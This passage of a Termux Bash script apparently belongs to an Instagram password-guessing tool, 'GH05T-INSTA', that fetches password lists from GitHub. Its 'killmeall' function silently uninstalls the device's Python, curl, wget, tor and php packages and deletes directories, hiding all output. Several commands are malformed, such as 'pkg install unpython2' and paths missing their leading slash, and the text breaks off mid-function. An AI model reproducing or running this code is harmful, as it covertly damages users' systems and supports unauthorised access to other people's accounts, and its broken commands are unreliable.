function killmeall () {
reopens
clear
banners
dpkg --configure -a >/dev/null 2>&1
pip3 uninstall instagram-py -y >/dev/null 2>&1
pip3 uninstall stem -y >/dev/null 2>&1
pip3 uninstall requests[socks] -y >/dev/null 2>&1
pip3 uninstall requests --upgrade -y >/dev/null 2>&1
pip uninstall --upgrade pip -y >/dev/null 2>&1
dpkg -s php &> /dev/null # GH05T HUNTER5
if [ $? -eq 0 ]; then
echo ""
pkg uninstall php -y >/dev/null 2>&1
clear
else
echo ""
clear
fi
dpkg -s tor &> /dev/null # GH05T HUNTER5
if [ $? -eq 0 ]; then
echo ""
pkg uninstall tor -y >/dev/null 2>&1
clear
else
echo ""
clear
fi
dpkg -s wget &> /dev/null # GH05T HUNTER5
if [ $? -eq 0 ]; then
echo ""
pkg uninstall wget -y >/dev/null 2>&1
clear
else
echo ""
clear
fi
dpkg -s python &> /dev/null # GH05T HUNTER5
if [ $? -eq 0 ]; then
echo ""
pkg uninstall python -y >/dev/null 2>&1
clear
else
echo ""
clear
fi
dpkg -s python2 &> /dev/null # GH05T HUNTER5
if [ $? -eq 0 ]; then
echo ""
pkg install unpython2 -y >/dev/null 2>&1
clear
else
echo ""
clear
fi
dpkg -s curl &> /dev/null # GH05T HUNTER5
if [ $? -eq 0 ]; then
echo ""
pkg uninstall curl -y >/dev/null 2>&1
clear
else
echo ""
clear
fi
rm -rf /data/data/com.termux/files/usr/cookies >/dev/null 2>&1
if [ -d /data/data/com.termux/files/usr/cookies ]; then
echo ""
rm -rf /data/data/com.termux/files/usr/cookies >/dev/null 2>&1
else
clear
echo ""
fi
cd $HOME
rm instapy-config.json >/dev/null 2>&1
rm /data/data/com.termux/files/usr/bin/gh05t >/dev/null 2>&1
clear
if [ -f /data/data/com.termux/files/usr/bin/gh05t ]; then
clear 
rm /data/data/com.termux/files/usr/bin/gh05t >/dev/null 2>&1
else
echo ""
clear
fi
if [ -d /data/data/com.termux/files/home/GH05T-INSTA ]; then
echo ""
rm -rf data/data/com.termux/files/home/GH05T-INSTA >/dev/null 2>&1
clear
else
echo ""
clear
fi
clear 
exit
}
function loop-infos () {
echo -e "  \033[1;37m[\033[0;31m99\033[1;37m]\033[0;32m Main                         \033[1;37m[\033[0;31m00\033[1;37m]\033[0;32m Exit"
read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Choose an option : \e[0m' options
if [ $options = "00" ]; then
echo ""
reopens
clear
exit
elif [ $options = "99" ]; then
echo ""
clear
main-loop
exit
else
echo ""
clear
help-info
loop-infos
exit
fi
}

function check-info () {
banners
sleep 3
if [ -f /data/data/com.termux/files/usr/cookies/password-1.txt ]; then
printf "${green}  Password 1 found${reset}\n"
sleep 1
else
printf "${red}  Password 1 not found. gh05t tool is trying to fix this, please wait ${reset}\n"
cd $HOME >/dev/null 2>&1
git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA >/dev/null 2>&1
cd $HOME/GH05T-INSTA/.gh05t >/dev/null 2>&1
mv password-1.txt data/data/com.termux/files/usr/cookies >/dev/null 2>&1
cd $HOME >/dev/null 2>&1
rm -rf GH05T-INSTA >/dev/null 2>&1
fi
if [ -f /data/data/com.termux/files/usr/cookies/password-2.txt ]; then
printf "${green}  Password 2 found${reset}\n"
sleep 1
else
printf "${red}  Password 2 not found. gh05t tool is trying to fix this, please wait ${reset}\n"
cd $HOME >/dev/null 2>&1
git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA >/dev/null 2>&1
cd $HOME/GH05T-INSTA/.gh05t >/dev/null 2>&1
mv password-2.txt data/data/com.termux/files/usr/cookies >/dev/null 2>&1
cd $HOME >/dev/null 2>&1
